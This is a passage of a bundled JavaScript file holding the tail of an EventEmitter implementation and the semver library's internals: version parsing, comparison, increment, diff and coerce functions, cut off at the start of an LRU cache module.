          return this.listener.apply(this.target, arguments);
        }
      }
      function _onceWrap(target, type, listener) {
        var state = { fired: false, wrapFn: void 0, target, type, listener };
        var wrapped = onceWrapper.bind(state);
        wrapped.listener = listener;
        state.wrapFn = wrapped;
        return wrapped;
      }
      EventEmitter2.prototype.once = function once2(type, listener) {
        checkListener(listener);
        this.on(type, _onceWrap(this, type, listener));
        return this;
      };
      EventEmitter2.prototype.prependOnceListener = function prependOnceListener(type, listener) {
        checkListener(listener);
        this.prependListener(type, _onceWrap(this, type, listener));
        return this;
      };
      EventEmitter2.prototype.removeListener = function removeListener(type, listener) {
        var list, events, position, i, originalListener;
        checkListener(listener);
        events = this._events;
        if (events === void 0)
          return this;
        list = events[type];
        if (list === void 0)
          return this;
        if (list === listener || list.listener === listener) {
          if (--this._eventsCount === 0)
            this._events = /* @__PURE__ */ Object.create(null);
          else {
            delete events[type];
            if (events.removeListener)
              this.emit("removeListener", type, list.listener || listener);
          }
        } else if (typeof list !== "function") {
          position = -1;
          for (i = list.length - 1; i >= 0; i--) {
            if (list[i] === listener || list[i].listener === listener) {
              originalListener = list[i].listener;
              position = i;
              break;
            }
          }
          if (position < 0)
            return this;
          if (position === 0)
            list.shift();
          else {
            spliceOne(list, position);
          }
          if (list.length === 1)
            events[type] = list[0];
          if (events.removeListener !== void 0)
            this.emit("removeListener", type, originalListener || listener);
        }
        return this;
      };
      EventEmitter2.prototype.off = EventEmitter2.prototype.removeListener;
      EventEmitter2.prototype.removeAllListeners = function removeAllListeners(type) {
        var listeners, events, i;
        events = this._events;
        if (events === void 0)
          return this;
        if (events.removeListener === void 0) {
          if (arguments.length === 0) {
            this._events = /* @__PURE__ */ Object.create(null);
            this._eventsCount = 0;
          } else if (events[type] !== void 0) {
            if (--this._eventsCount === 0)
              this._events = /* @__PURE__ */ Object.create(null);
            else
              delete events[type];
          }
          return this;
        }
        if (arguments.length === 0) {
          var keys = Object.keys(events);
          var key;
          for (i = 0; i < keys.length; ++i) {
            key = keys[i];
            if (key === "removeListener") continue;
            this.removeAllListeners(key);
          }
          this.removeAllListeners("removeListener");
          this._events = /* @__PURE__ */ Object.create(null);
          this._eventsCount = 0;
          return this;
        }
        listeners = events[type];
        if (typeof listeners === "function") {
          this.removeListener(type, listeners);
        } else if (listeners !== void 0) {
          for (i = listeners.length - 1; i >= 0; i--) {
            this.removeListener(type, listeners[i]);
          }
        }
        return this;
      };
      function _listeners(target, type, unwrap) {
        var events = target._events;
        if (events === void 0)
          return [];
        var evlistener = events[type];
        if (evlistener === void 0)
          return [];
        if (typeof evlistener === "function")
          return unwrap ? [evlistener.listener || evlistener] : [evlistener];
        return unwrap ? unwrapListeners(evlistener) : arrayClone(evlistener, evlistener.length);
      }
      EventEmitter2.prototype.listeners = function listeners(type) {
        return _listeners(this, type, true);
      };
      EventEmitter2.prototype.rawListeners = function rawListeners(type) {
        return _listeners(this, type, false);
      };
      EventEmitter2.listenerCount = function(emitter, type) {
        if (typeof emitter.listenerCount === "function") {
          return emitter.listenerCount(type);
        } else {
          return listenerCount.call(emitter, type);
        }
      };
      EventEmitter2.prototype.listenerCount = listenerCount;
      function listenerCount(type) {
        var events = this._events;
        if (events !== void 0) {
          var evlistener = events[type];
          if (typeof evlistener === "function") {
            return 1;
          } else if (evlistener !== void 0) {
            return evlistener.length;
          }
        }
        return 0;
      }
      EventEmitter2.prototype.eventNames = function eventNames() {
        return this._eventsCount > 0 ? ReflectOwnKeys(this._events) : [];
      };
      function arrayClone(arr, n) {
        var copy = new Array(n);
        for (var i = 0; i < n; ++i)
          copy[i] = arr[i];
        return copy;
      }
      function spliceOne(list, index) {
        for (; index + 1 < list.length; index++)
          list[index] = list[index + 1];
        list.pop();
      }
      function unwrapListeners(arr) {
        var ret = new Array(arr.length);
        for (var i = 0; i < ret.length; ++i) {
          ret[i] = arr[i].listener || arr[i];
        }
        return ret;
      }
      function once(emitter, name) {
        return new Promise(function(resolve, reject) {
          function errorListener(err) {
            emitter.removeListener(name, resolver);
            reject(err);
          }
          function resolver() {
            if (typeof emitter.removeListener === "function") {
              emitter.removeListener("error", errorListener);
            }
            resolve([].slice.call(arguments));
          }
          ;
          eventTargetAgnosticAddListener(emitter, name, resolver, { once: true });
          if (name !== "error") {
            addErrorHandlerIfEventEmitter(emitter, errorListener, { once: true });
          }
        });
      }
      function addErrorHandlerIfEventEmitter(emitter, handler, flags) {
        if (typeof emitter.on === "function") {
          eventTargetAgnosticAddListener(emitter, "error", handler, flags);
        }
      }
      function eventTargetAgnosticAddListener(emitter, name, listener, flags) {
        if (typeof emitter.on === "function") {
          if (flags.once) {
            emitter.once(name, listener);
          } else {
            emitter.on(name, listener);
          }
        } else if (typeof emitter.addEventListener === "function") {
          emitter.addEventListener(name, function wrapListener(arg) {
            if (flags.once) {
              emitter.removeEventListener(name, wrapListener);
            }
            listener(arg);
          });
        } else {
          throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type ' + typeof emitter);
        }
      }
    }
  });

  // node_modules/semver/internal/constants.js
  var require_constants = __commonJS({
    "node_modules/semver/internal/constants.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SEMVER_SPEC_VERSION = "2.0.0";
      var MAX_LENGTH = 256;
      var MAX_SAFE_INTEGER = Number.MAX_SAFE_INTEGER || /* istanbul ignore next */
      9007199254740991;
      var MAX_SAFE_COMPONENT_LENGTH = 16;
      var MAX_SAFE_BUILD_LENGTH = MAX_LENGTH - 6;
      var RELEASE_TYPES = [
        "major",
        "premajor",
        "minor",
        "preminor",
        "patch",
        "prepatch",
        "prerelease"
      ];
      module.exports = {
        MAX_LENGTH,
        MAX_SAFE_COMPONENT_LENGTH,
        MAX_SAFE_BUILD_LENGTH,
        MAX_SAFE_INTEGER,
        RELEASE_TYPES,
        SEMVER_SPEC_VERSION,
        FLAG_INCLUDE_PRERELEASE: 1,
        FLAG_LOOSE: 2
      };
    }
  });

  // node_modules/semver/internal/debug.js
  var require_debug = __commonJS({
    "node_modules/semver/internal/debug.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var debug = typeof process === "object" && process.env && process.env.NODE_DEBUG && /\bsemver\b/i.test(process.env.NODE_DEBUG) ? (...args) => console.error("SEMVER", ...args) : () => {
      };
      module.exports = debug;
    }
  });

  // node_modules/semver/internal/re.js
  var require_re = __commonJS({
    "node_modules/semver/internal/re.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var {
        MAX_SAFE_COMPONENT_LENGTH,
        MAX_SAFE_BUILD_LENGTH,
        MAX_LENGTH
      } = require_constants();
      var debug = require_debug();
      exports = module.exports = {};
      var re = exports.re = [];
      var safeRe = exports.safeRe = [];
      var src = exports.src = [];
      var safeSrc = exports.safeSrc = [];
      var t = exports.t = {};
      var R = 0;
      var LETTERDASHNUMBER = "[a-zA-Z0-9-]";
      var safeRegexReplacements = [
        ["\\s", 1],
        ["\\d", MAX_LENGTH],
        [LETTERDASHNUMBER, MAX_SAFE_BUILD_LENGTH]
      ];
      var makeSafeRegex = (value) => {
        for (const [token, max] of safeRegexReplacements) {
          value = value.split(`${token}*`).join(`${token}{0,${max}}`).split(`${token}+`).join(`${token}{1,${max}}`);
        }
        return value;
      };
      var createToken = (name, value, isGlobal) => {
        const safe = makeSafeRegex(value);
        const index = R++;
        debug(name, index, value);
        t[name] = index;
        src[index] = value;
        safeSrc[index] = safe;
        re[index] = new RegExp(value, isGlobal ? "g" : void 0);
        safeRe[index] = new RegExp(safe, isGlobal ? "g" : void 0);
      };
      createToken("NUMERICIDENTIFIER", "0|[1-9]\\d*");
      createToken("NUMERICIDENTIFIERLOOSE", "\\d+");
      createToken("NONNUMERICIDENTIFIER", `\\d*[a-zA-Z-]${LETTERDASHNUMBER}*`);
      createToken("MAINVERSION", `(${src[t.NUMERICIDENTIFIER]})\\.(${src[t.NUMERICIDENTIFIER]})\\.(${src[t.NUMERICIDENTIFIER]})`);
      createToken("MAINVERSIONLOOSE", `(${src[t.NUMERICIDENTIFIERLOOSE]})\\.(${src[t.NUMERICIDENTIFIERLOOSE]})\\.(${src[t.NUMERICIDENTIFIERLOOSE]})`);
      createToken("PRERELEASEIDENTIFIER", `(?:${src[t.NONNUMERICIDENTIFIER]}|${src[t.NUMERICIDENTIFIER]})`);
      createToken("PRERELEASEIDENTIFIERLOOSE", `(?:${src[t.NONNUMERICIDENTIFIER]}|${src[t.NUMERICIDENTIFIERLOOSE]})`);
      createToken("PRERELEASE", `(?:-(${src[t.PRERELEASEIDENTIFIER]}(?:\\.${src[t.PRERELEASEIDENTIFIER]})*))`);
      createToken("PRERELEASELOOSE", `(?:-?(${src[t.PRERELEASEIDENTIFIERLOOSE]}(?:\\.${src[t.PRERELEASEIDENTIFIERLOOSE]})*))`);
      createToken("BUILDIDENTIFIER", `${LETTERDASHNUMBER}+`);
      createToken("BUILD", `(?:\\+(${src[t.BUILDIDENTIFIER]}(?:\\.${src[t.BUILDIDENTIFIER]})*))`);
      createToken("FULLPLAIN", `v?${src[t.MAINVERSION]}${src[t.PRERELEASE]}?${src[t.BUILD]}?`);
      createToken("FULL", `^${src[t.FULLPLAIN]}$`);
      createToken("LOOSEPLAIN", `[v=\\s]*${src[t.MAINVERSIONLOOSE]}${src[t.PRERELEASELOOSE]}?${src[t.BUILD]}?`);
      createToken("LOOSE", `^${src[t.LOOSEPLAIN]}$`);
      createToken("GTLT", "((?:<|>)?=?)");
      createToken("XRANGEIDENTIFIERLOOSE", `${src[t.NUMERICIDENTIFIERLOOSE]}|x|X|\\*`);
      createToken("XRANGEIDENTIFIER", `${src[t.NUMERICIDENTIFIER]}|x|X|\\*`);
      createToken("XRANGEPLAIN", `[v=\\s]*(${src[t.XRANGEIDENTIFIER]})(?:\\.(${src[t.XRANGEIDENTIFIER]})(?:\\.(${src[t.XRANGEIDENTIFIER]})(?:${src[t.PRERELEASE]})?${src[t.BUILD]}?)?)?`);
      createToken("XRANGEPLAINLOOSE", `[v=\\s]*(${src[t.XRANGEIDENTIFIERLOOSE]})(?:\\.(${src[t.XRANGEIDENTIFIERLOOSE]})(?:\\.(${src[t.XRANGEIDENTIFIERLOOSE]})(?:${src[t.PRERELEASELOOSE]})?${src[t.BUILD]}?)?)?`);
      createToken("XRANGE", `^${src[t.GTLT]}\\s*${src[t.XRANGEPLAIN]}$`);
      createToken("XRANGELOOSE", `^${src[t.GTLT]}\\s*${src[t.XRANGEPLAINLOOSE]}$`);
      createToken("COERCEPLAIN", `${"(^|[^\\d])(\\d{1,"}${MAX_SAFE_COMPONENT_LENGTH}})(?:\\.(\\d{1,${MAX_SAFE_COMPONENT_LENGTH}}))?(?:\\.(\\d{1,${MAX_SAFE_COMPONENT_LENGTH}}))?`);
      createToken("COERCE", `${src[t.COERCEPLAIN]}(?:$|[^\\d])`);
      createToken("COERCEFULL", src[t.COERCEPLAIN] + `(?:${src[t.PRERELEASE]})?(?:${src[t.BUILD]})?(?:$|[^\\d])`);
      createToken("COERCERTL", src[t.COERCE], true);
      createToken("COERCERTLFULL", src[t.COERCEFULL], true);
      createToken("LONETILDE", "(?:~>?)");
      createToken("TILDETRIM", `(\\s*)${src[t.LONETILDE]}\\s+`, true);
      exports.tildeTrimReplace = "$1~";
      createToken("TILDE", `^${src[t.LONETILDE]}${src[t.XRANGEPLAIN]}$`);
      createToken("TILDELOOSE", `^${src[t.LONETILDE]}${src[t.XRANGEPLAINLOOSE]}$`);
      createToken("LONECARET", "(?:\\^)");
      createToken("CARETTRIM", `(\\s*)${src[t.LONECARET]}\\s+`, true);
      exports.caretTrimReplace = "$1^";
      createToken("CARET", `^${src[t.LONECARET]}${src[t.XRANGEPLAIN]}$`);
      createToken("CARETLOOSE", `^${src[t.LONECARET]}${src[t.XRANGEPLAINLOOSE]}$`);
      createToken("COMPARATORLOOSE", `^${src[t.GTLT]}\\s*(${src[t.LOOSEPLAIN]})$|^$`);
      createToken("COMPARATOR", `^${src[t.GTLT]}\\s*(${src[t.FULLPLAIN]})$|^$`);
      createToken("COMPARATORTRIM", `(\\s*)${src[t.GTLT]}\\s*(${src[t.LOOSEPLAIN]}|${src[t.XRANGEPLAIN]})`, true);
      exports.comparatorTrimReplace = "$1$2$3";
      createToken("HYPHENRANGE", `^\\s*(${src[t.XRANGEPLAIN]})\\s+-\\s+(${src[t.XRANGEPLAIN]})\\s*$`);
      createToken("HYPHENRANGELOOSE", `^\\s*(${src[t.XRANGEPLAINLOOSE]})\\s+-\\s+(${src[t.XRANGEPLAINLOOSE]})\\s*$`);
      createToken("STAR", "(<|>)?=?\\s*\\*");
      createToken("GTE0", "^\\s*>=\\s*0\\.0\\.0\\s*$");
      createToken("GTE0PRE", "^\\s*>=\\s*0\\.0\\.0-0\\s*$");
    }
  });

  // node_modules/semver/internal/parse-options.js
  var require_parse_options = __commonJS({
    "node_modules/semver/internal/parse-options.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var looseOption = Object.freeze({ loose: true });
      var emptyOpts = Object.freeze({});
      var parseOptions = (options) => {
        if (!options) {
          return emptyOpts;
        }
        if (typeof options !== "object") {
          return looseOption;
        }
        return options;
      };
      module.exports = parseOptions;
    }
  });

  // node_modules/semver/internal/identifiers.js
  var require_identifiers = __commonJS({
    "node_modules/semver/internal/identifiers.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var numeric = /^[0-9]+$/;
      var compareIdentifiers = (a, b) => {
        if (typeof a === "number" && typeof b === "number") {
          return a === b ? 0 : a < b ? -1 : 1;
        }
        const anum = numeric.test(a);
        const bnum = numeric.test(b);
        if (anum && bnum) {
          a = +a;
          b = +b;
        }
        return a === b ? 0 : anum && !bnum ? -1 : bnum && !anum ? 1 : a < b ? -1 : 1;
      };
      var rcompareIdentifiers = (a, b) => compareIdentifiers(b, a);
      module.exports = {
        compareIdentifiers,
        rcompareIdentifiers
      };
    }
  });

  // node_modules/semver/classes/semver.js
  var require_semver = __commonJS({
    "node_modules/semver/classes/semver.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var debug = require_debug();
      var { MAX_LENGTH, MAX_SAFE_INTEGER } = require_constants();
      var { safeRe: re, t } = require_re();
      var parseOptions = require_parse_options();
      var { compareIdentifiers } = require_identifiers();
      var SemVer = class _SemVer {
        constructor(version, options) {
          options = parseOptions(options);
          if (version instanceof _SemVer) {
            if (version.loose === !!options.loose && version.includePrerelease === !!options.includePrerelease) {
              return version;
            } else {
              version = version.version;
            }
          } else if (typeof version !== "string") {
            throw new TypeError(`Invalid version. Must be a string. Got type "${typeof version}".`);
          }
          if (version.length > MAX_LENGTH) {
            throw new TypeError(
              `version is longer than ${MAX_LENGTH} characters`
            );
          }
          debug("SemVer", version, options);
          this.options = options;
          this.loose = !!options.loose;
          this.includePrerelease = !!options.includePrerelease;
          const m = version.trim().match(options.loose ? re[t.LOOSE] : re[t.FULL]);
          if (!m) {
            throw new TypeError(`Invalid Version: ${version}`);
          }
          this.raw = version;
          this.major = +m[1];
          this.minor = +m[2];
          this.patch = +m[3];
          if (this.major > MAX_SAFE_INTEGER || this.major < 0) {
            throw new TypeError("Invalid major version");
          }
          if (this.minor > MAX_SAFE_INTEGER || this.minor < 0) {
            throw new TypeError("Invalid minor version");
          }
          if (this.patch > MAX_SAFE_INTEGER || this.patch < 0) {
            throw new TypeError("Invalid patch version");
          }
          if (!m[4]) {
            this.prerelease = [];
          } else {
            this.prerelease = m[4].split(".").map((id2) => {
              if (/^[0-9]+$/.test(id2)) {
                const num = +id2;
                if (num >= 0 && num < MAX_SAFE_INTEGER) {
                  return num;
                }
              }
              return id2;
            });
          }
          this.build = m[5] ? m[5].split(".") : [];
          this.format();
        }
        format() {
          this.version = `${this.major}.${this.minor}.${this.patch}`;
          if (this.prerelease.length) {
            this.version += `-${this.prerelease.join(".")}`;
          }
          return this.version;
        }
        toString() {
          return this.version;
        }
        compare(other) {
          debug("SemVer.compare", this.version, this.options, other);
          if (!(other instanceof _SemVer)) {
            if (typeof other === "string" && other === this.version) {
              return 0;
            }
            other = new _SemVer(other, this.options);
          }
          if (other.version === this.version) {
            return 0;
          }
          return this.compareMain(other) || this.comparePre(other);
        }
        compareMain(other) {
          if (!(other instanceof _SemVer)) {
            other = new _SemVer(other, this.options);
          }
          if (this.major < other.major) {
            return -1;
          }
          if (this.major > other.major) {
            return 1;
          }
          if (this.minor < other.minor) {
            return -1;
          }
          if (this.minor > other.minor) {
            return 1;
          }
          if (this.patch < other.patch) {
            return -1;
          }
          if (this.patch > other.patch) {
            return 1;
          }
          return 0;
        }
        comparePre(other) {
          if (!(other instanceof _SemVer)) {
            other = new _SemVer(other, this.options);
          }
          if (this.prerelease.length && !other.prerelease.length) {
            return -1;
          } else if (!this.prerelease.length && other.prerelease.length) {
            return 1;
          } else if (!this.prerelease.length && !other.prerelease.length) {
            return 0;
          }
          let i = 0;
          do {
            const a = this.prerelease[i];
            const b = other.prerelease[i];
            debug("prerelease compare", i, a, b);
            if (a === void 0 && b === void 0) {
              return 0;
            } else if (b === void 0) {
              return 1;
            } else if (a === void 0) {
              return -1;
            } else if (a === b) {
              continue;
            } else {
              return compareIdentifiers(a, b);
            }
          } while (++i);
        }
        compareBuild(other) {
          if (!(other instanceof _SemVer)) {
            other = new _SemVer(other, this.options);
          }
          let i = 0;
          do {
            const a = this.build[i];
            const b = other.build[i];
            debug("build compare", i, a, b);
            if (a === void 0 && b === void 0) {
              return 0;
            } else if (b === void 0) {
              return 1;
            } else if (a === void 0) {
              return -1;
            } else if (a === b) {
              continue;
            } else {
              return compareIdentifiers(a, b);
            }
          } while (++i);
        }
        // preminor will bump the version up to the next minor release, and immediately
        // down to pre-release. premajor and prepatch work the same way.
        inc(release, identifier, identifierBase) {
          if (release.startsWith("pre")) {
            if (!identifier && identifierBase === false) {
              throw new Error("invalid increment argument: identifier is empty");
            }
            if (identifier) {
              const match = `-${identifier}`.match(this.options.loose ? re[t.PRERELEASELOOSE] : re[t.PRERELEASE]);
              if (!match || match[1] !== identifier) {
                throw new Error(`invalid identifier: ${identifier}`);
              }
            }
          }
          switch (release) {
            case "premajor":
              this.prerelease.length = 0;
              this.patch = 0;
              this.minor = 0;
              this.major++;
              this.inc("pre", identifier, identifierBase);
              break;
            case "preminor":
              this.prerelease.length = 0;
              this.patch = 0;
              this.minor++;
              this.inc("pre", identifier, identifierBase);
              break;
            case "prepatch":
              this.prerelease.length = 0;
              this.inc("patch", identifier, identifierBase);
              this.inc("pre", identifier, identifierBase);
              break;
            // If the input is a non-prerelease version, this acts the same as
            // prepatch.
            case "prerelease":
              if (this.prerelease.length === 0) {
                this.inc("patch", identifier, identifierBase);
              }
              this.inc("pre", identifier, identifierBase);
              break;
            case "release":
              if (this.prerelease.length === 0) {
                throw new Error(`version ${this.raw} is not a prerelease`);
              }
              this.prerelease.length = 0;
              break;
            case "major":
              if (this.minor !== 0 || this.patch !== 0 || this.prerelease.length === 0) {
                this.major++;
              }
              this.minor = 0;
              this.patch = 0;
              this.prerelease = [];
              break;
            case "minor":
              if (this.patch !== 0 || this.prerelease.length === 0) {
                this.minor++;
              }
              this.patch = 0;
              this.prerelease = [];
              break;
            case "patch":
              if (this.prerelease.length === 0) {
                this.patch++;
              }
              this.prerelease = [];
              break;
            // This probably shouldn't be used publicly.
            // 1.0.0 'pre' would become 1.0.0-0 which is the wrong direction.
            case "pre": {
              const base = Number(identifierBase) ? 1 : 0;
              if (this.prerelease.length === 0) {
                this.prerelease = [base];
              } else {
                let i = this.prerelease.length;
                while (--i >= 0) {
                  if (typeof this.prerelease[i] === "number") {
                    this.prerelease[i]++;
                    i = -2;
                  }
                }
                if (i === -1) {
                  if (identifier === this.prerelease.join(".") && identifierBase === false) {
                    throw new Error("invalid increment argument: identifier already exists");
                  }
                  this.prerelease.push(base);
                }
              }
              if (identifier) {
                let prerelease = [identifier, base];
                if (identifierBase === false) {
                  prerelease = [identifier];
                }
                if (compareIdentifiers(this.prerelease[0], identifier) === 0) {
                  if (isNaN(this.prerelease[1])) {
                    this.prerelease = prerelease;
                  }
                } else {
                  this.prerelease = prerelease;
                }
              }
              break;
            }
            default:
              throw new Error(`invalid increment argument: ${release}`);
          }
          this.raw = this.format();
          if (this.build.length) {
            this.raw += `+${this.build.join(".")}`;
          }
          return this;
        }
      };
      module.exports = SemVer;
    }
  });

  // node_modules/semver/functions/parse.js
  var require_parse = __commonJS({
    "node_modules/semver/functions/parse.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var parse = (version, options, throwErrors = false) => {
        if (version instanceof SemVer) {
          return version;
        }
        try {
          return new SemVer(version, options);
        } catch (er) {
          if (!throwErrors) {
            return null;
          }
          throw er;
        }
      };
      module.exports = parse;
    }
  });

  // node_modules/semver/functions/valid.js
  var require_valid = __commonJS({
    "node_modules/semver/functions/valid.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var parse = require_parse();
      var valid = (version, options) => {
        const v = parse(version, options);
        return v ? v.version : null;
      };
      module.exports = valid;
    }
  });

  // node_modules/semver/functions/clean.js
  var require_clean = __commonJS({
    "node_modules/semver/functions/clean.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var parse = require_parse();
      var clean = (version, options) => {
        const s = parse(version.trim().replace(/^[=v]+/, ""), options);
        return s ? s.version : null;
      };
      module.exports = clean;
    }
  });

  // node_modules/semver/functions/inc.js
  var require_inc = __commonJS({
    "node_modules/semver/functions/inc.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var inc = (version, release, options, identifier, identifierBase) => {
        if (typeof options === "string") {
          identifierBase = identifier;
          identifier = options;
          options = void 0;
        }
        try {
          return new SemVer(
            version instanceof SemVer ? version.version : version,
            options
          ).inc(release, identifier, identifierBase).version;
        } catch (er) {
          return null;
        }
      };
      module.exports = inc;
    }
  });

  // node_modules/semver/functions/diff.js
  var require_diff = __commonJS({
    "node_modules/semver/functions/diff.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var parse = require_parse();
      var diff = (version1, version2) => {
        const v1 = parse(version1, null, true);
        const v2 = parse(version2, null, true);
        const comparison = v1.compare(v2);
        if (comparison === 0) {
          return null;
        }
        const v1Higher = comparison > 0;
        const highVersion = v1Higher ? v1 : v2;
        const lowVersion = v1Higher ? v2 : v1;
        const highHasPre = !!highVersion.prerelease.length;
        const lowHasPre = !!lowVersion.prerelease.length;
        if (lowHasPre && !highHasPre) {
          if (!lowVersion.patch && !lowVersion.minor) {
            return "major";
          }
          if (lowVersion.compareMain(highVersion) === 0) {
            if (lowVersion.minor && !lowVersion.patch) {
              return "minor";
            }
            return "patch";
          }
        }
        const prefix = highHasPre ? "pre" : "";
        if (v1.major !== v2.major) {
          return prefix + "major";
        }
        if (v1.minor !== v2.minor) {
          return prefix + "minor";
        }
        if (v1.patch !== v2.patch) {
          return prefix + "patch";
        }
        return "prerelease";
      };
      module.exports = diff;
    }
  });

  // node_modules/semver/functions/major.js
  var require_major = __commonJS({
    "node_modules/semver/functions/major.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var major = (a, loose) => new SemVer(a, loose).major;
      module.exports = major;
    }
  });

  // node_modules/semver/functions/minor.js
  var require_minor = __commonJS({
    "node_modules/semver/functions/minor.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var minor = (a, loose) => new SemVer(a, loose).minor;
      module.exports = minor;
    }
  });

  // node_modules/semver/functions/patch.js
  var require_patch = __commonJS({
    "node_modules/semver/functions/patch.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var patch = (a, loose) => new SemVer(a, loose).patch;
      module.exports = patch;
    }
  });

  // node_modules/semver/functions/prerelease.js
  var require_prerelease = __commonJS({
    "node_modules/semver/functions/prerelease.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var parse = require_parse();
      var prerelease = (version, options) => {
        const parsed = parse(version, options);
        return parsed && parsed.prerelease.length ? parsed.prerelease : null;
      };
      module.exports = prerelease;
    }
  });

  // node_modules/semver/functions/compare.js
  var require_compare = __commonJS({
    "node_modules/semver/functions/compare.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var compare = (a, b, loose) => new SemVer(a, loose).compare(new SemVer(b, loose));
      module.exports = compare;
    }
  });

  // node_modules/semver/functions/rcompare.js
  var require_rcompare = __commonJS({
    "node_modules/semver/functions/rcompare.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var compare = require_compare();
      var rcompare = (a, b, loose) => compare(b, a, loose);
      module.exports = rcompare;
    }
  });

  // node_modules/semver/functions/compare-loose.js
  var require_compare_loose = __commonJS({
    "node_modules/semver/functions/compare-loose.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var compare = require_compare();
      var compareLoose = (a, b) => compare(a, b, true);
      module.exports = compareLoose;
    }
  });

  // node_modules/semver/functions/compare-build.js
  var require_compare_build = __commonJS({
    "node_modules/semver/functions/compare-build.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var compareBuild = (a, b, loose) => {
        const versionA = new SemVer(a, loose);
        const versionB = new SemVer(b, loose);
        return versionA.compare(versionB) || versionA.compareBuild(versionB);
      };
      module.exports = compareBuild;
    }
  });

  // node_modules/semver/functions/sort.js
  var require_sort = __commonJS({
    "node_modules/semver/functions/sort.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var compareBuild = require_compare_build();
      var sort = (list, loose) => list.sort((a, b) => compareBuild(a, b, loose));
      module.exports = sort;
    }
  });

  // node_modules/semver/functions/rsort.js
  var require_rsort = __commonJS({
    "node_modules/semver/functions/rsort.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var compareBuild = require_compare_build();
      var rsort = (list, loose) => list.sort((a, b) => compareBuild(b, a, loose));
      module.exports = rsort;
    }
  });

  // node_modules/semver/functions/gt.js
  var require_gt = __commonJS({
    "node_modules/semver/functions/gt.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var compare = require_compare();
      var gt = (a, b, loose) => compare(a, b, loose) > 0;
      module.exports = gt;
    }
  });

  // node_modules/semver/functions/lt.js
  var require_lt = __commonJS({
    "node_modules/semver/functions/lt.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var compare = require_compare();
      var lt = (a, b, loose) => compare(a, b, loose) < 0;
      module.exports = lt;
    }
  });

  // node_modules/semver/functions/eq.js
  var require_eq = __commonJS({
    "node_modules/semver/functions/eq.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var compare = require_compare();
      var eq = (a, b, loose) => compare(a, b, loose) === 0;
      module.exports = eq;
    }
  });

  // node_modules/semver/functions/neq.js
  var require_neq = __commonJS({
    "node_modules/semver/functions/neq.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var compare = require_compare();
      var neq = (a, b, loose) => compare(a, b, loose) !== 0;
      module.exports = neq;
    }
  });

  // node_modules/semver/functions/gte.js
  var require_gte = __commonJS({
    "node_modules/semver/functions/gte.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var compare = require_compare();
      var gte = (a, b, loose) => compare(a, b, loose) >= 0;
      module.exports = gte;
    }
  });

  // node_modules/semver/functions/lte.js
  var require_lte = __commonJS({
    "node_modules/semver/functions/lte.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var compare = require_compare();
      var lte = (a, b, loose) => compare(a, b, loose) <= 0;
      module.exports = lte;
    }
  });

  // node_modules/semver/functions/cmp.js
  var require_cmp = __commonJS({
    "node_modules/semver/functions/cmp.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var eq = require_eq();
      var neq = require_neq();
      var gt = require_gt();
      var gte = require_gte();
      var lt = require_lt();
      var lte = require_lte();
      var cmp = (a, op, b, loose) => {
        switch (op) {
          case "===":
            if (typeof a === "object") {
              a = a.version;
            }
            if (typeof b === "object") {
              b = b.version;
            }
            return a === b;
          case "!==":
            if (typeof a === "object") {
              a = a.version;
            }
            if (typeof b === "object") {
              b = b.version;
            }
            return a !== b;
          case "":
          case "=":
          case "==":
            return eq(a, b, loose);
          case "!=":
            return neq(a, b, loose);
          case ">":
            return gt(a, b, loose);
          case ">=":
            return gte(a, b, loose);
          case "<":
            return lt(a, b, loose);
          case "<=":
            return lte(a, b, loose);
          default:
            throw new TypeError(`Invalid operator: ${op}`);
        }
      };
      module.exports = cmp;
    }
  });

  // node_modules/semver/functions/coerce.js
  var require_coerce = __commonJS({
    "node_modules/semver/functions/coerce.js"(exports, module) {
      "use strict";
      init_buffer_shim();
      var SemVer = require_semver();
      var parse = require_parse();
      var { safeRe: re, t } = require_re();
      var coerce = (version, options) => {
        if (version instanceof SemVer) {
          return version;
        }
        if (typeof version === "number") {
          version = String(version);
        }
        if (typeof version !== "string") {
          return null;
        }
        options = options || {};
        let match = null;
        if (!options.rtl) {
          match = version.match(options.includePrerelease ? re[t.COERCEFULL] : re[t.COERCE]);
        } else {
          const coerceRtlRegex = options.includePrerelease ? re[t.COERCERTLFULL] : re[t.COERCERTL];
          let next;
          while ((next = coerceRtlRegex.exec(version)) && (!match || match.index + match[0].length !== version.length)) {
            if (!match || next.index + next[0].length !== match.index + match[0].length) {
              match = next;
            }
            coerceRtlRegex.lastIndex = next.index + next[1].length + next[2].length;
          }
          coerceRtlRegex.lastIndex = -1;
        }
        if (match === null) {
          return null;
        }
        const major = match[2];
        const minor = match[3] || "0";
        const patch = match[4] || "0";
        const prerelease = options.includePrerelease && match[5] ? `-${match[5]}` : "";
        const build = options.includePrerelease && match[6] ? `+${match[6]}` : "";
        return parse(`${major}.${minor}.${patch}${prerelease}${build}`, options);
      };
      module.exports = coerce;
    }
  });

  // node_modules/semver/internal/lrucache.js
  var require_lrucache = __commonJS({
